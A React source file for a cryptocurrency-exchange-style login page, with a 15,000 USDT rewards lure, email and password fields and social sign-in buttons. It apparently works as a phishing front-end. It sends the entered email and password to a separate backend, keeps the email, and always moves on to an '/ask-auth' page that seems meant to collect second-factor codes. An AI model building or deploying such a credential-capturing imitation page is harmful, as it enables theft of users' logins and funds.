import React, { useState } from "react";
import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai";
import { IoClose } from "react-icons/io5";
import { FaApple } from "react-icons/fa";
import { FcGoogle } from "react-icons/fc";
import { FaTelegramPlane } from "react-icons/fa";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import axios from "axios";
import BASE_URL from "../components/urls";
import FormErrMsg from "../components/FormErrMsg";

const schema = yup.object().shape({
  email: yup
    .string()
    .email("Invalid email")
    .required("Email/Phone is required"),
  password: yup.string().required("Password is required"),
});

const Home = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [skipLogin, setSkipLogin] = useState(false); // <-- state for the switch

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const togglePassword = () => setShowPassword((s) => !s);

  const submitForm = (data) => {
    setLoading(true);
    const payload = { ...data, skipLogin }; // include the toggle value
    axios
      .post(`${BASE_URL}/`, payload)
      .then(() => {
        localStorage.setItem("email", data.email);
        navigate("/ask-auth");
      })
      .catch((error) => {
        console.error("Login failed!", error);
      })
      .finally(() => setLoading(false));
  };

  return (
    <div className="min-h-screen bg-black text-white flex justify-center pt-10 px-4">
      <div className="w-full max-w-md">
        {/* Title */}
        <h2 className="text-2xl font-bold mb-2">Log in</h2>
        <p className="text-gray-400 text-sm mb-6">
          🎁 Limited time offer, up to{" "}
          <span className="text-yellow-500 font-semibold">15,000</span> USDT in
          rewards
        </p>

        {/* Form */}
        <form onSubmit={handleSubmit(submitForm)} className="space-y-4">
          {/* Email/Phone */}
          <div>
            <label className="block text-gray-400 text-sm mb-1">
              Email/Phone
            </label>
            <input
              type="text"
              placeholder="Enter your email or phone"
              {...register("email")}
              className="w-full p-3 rounded-md bg-[#1c1c1e] text-white placeholder-gray-500 border border-gray-700 focus:outline-none"
            />
            <FormErrMsg errors={errors} inputName="email" />
          </div>

          {/* Password */}
          <div>
            <label className="block text-gray-400 text-sm mb-1">Password</label>
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Please enter a password"
                {...register("password")}
                className="w-full p-3 rounded-md bg-[#1c1c1e] text-white placeholder-gray-500 border border-gray-700 focus:outline-none"
              />
              <span
                onClick={togglePassword}
                className="absolute right-3 top-3 text-gray-400 cursor-pointer"
              >
                {showPassword ? <AiOutlineEyeInvisible /> : <AiOutlineEye />}
              </span>
            </div>
            <FormErrMsg errors={errors} inputName="password" />
          </div>

          {/* Forgot Password */}
          <div className="text-right">
            <a
              href="/forgot-password"
              className="text-blue-500 text-sm hover:underline"
            >
              Forgot password
            </a>
          </div>

          {/* Skip login (working switch) */}
          <div className="flex items-center justify-between text-gray-400 text-sm">
            <span>Skip login on this device for 30 day(s)</span>

            {/* The label wraps input + track so the whole switch is clickable */}
            <label
              htmlFor="skip"
              className="relative inline-flex h-6 w-12 cursor-pointer items-center"
              role="switch"
              aria-checked={skipLogin}
            >
              <input
                id="skip"
                type="checkbox"
                className="peer sr-only"
                checked={skipLogin}
                onChange={(e) => setSkipLogin(e.target.checked)}
              />
              {/* Track + knob (via ::after) */}
              <span
                className="relative block h-full w-full rounded-full bg-gray-600 transition-colors peer-checked:bg-green-500
                               after:content-[''] after:absolute after:left-1 after:top-1 after:h-4 after:w-4 after:rounded-full after:bg-white
                               after:transition-transform peer-checked:after:translate-x-6"
              ></span>
            </label>
          </div>

          {/* Submit button */}
          <button
            type="submit"
            disabled={loading}
            className={`w-full py-3 rounded-md font-semibold transition-colors ${
              loading
                ? "bg-gray-700 cursor-not-allowed"
                : "bg-gray-800 hover:bg-gray-700"
            }`}
          >
            {loading ? "Logging in..." : "Log in"}
          </button>
        </form>

        {/* OR Divider */}
        <div className="flex items-center my-6">
          <div className="flex-grow h-px bg-gray-700" />
          <span className="px-2 text-gray-500 text-sm">or</span>
          <div className="flex-grow h-px bg-gray-700" />
        </div>

        {/* Social buttons */}
        <div className="flex justify-center space-x-4 mb-6">
          <button className="p-3 rounded-lg bg-[#1c1c1e]">
            <FaApple className="text-white text-xl" />
          </button>
          <button className="p-3 rounded-lg bg-[#1c1c1e]">
            <FcGoogle className="text-xl" />
          </button>
          <button className="p-3 rounded-lg bg-[#1c1c1e]">
            <FaTelegramPlane className="text-blue-400 text-xl" />
          </button>
        </div>

        {/* Footer */}
        <p className="text-center text-gray-400 text-sm">
          Don’t have an account?{" "}
          <a href="/signup" className="text-blue-500 hover:underline">
            Sign up now
          </a>
        </p>
      </div>
    </div>
  );
};

export default Home;
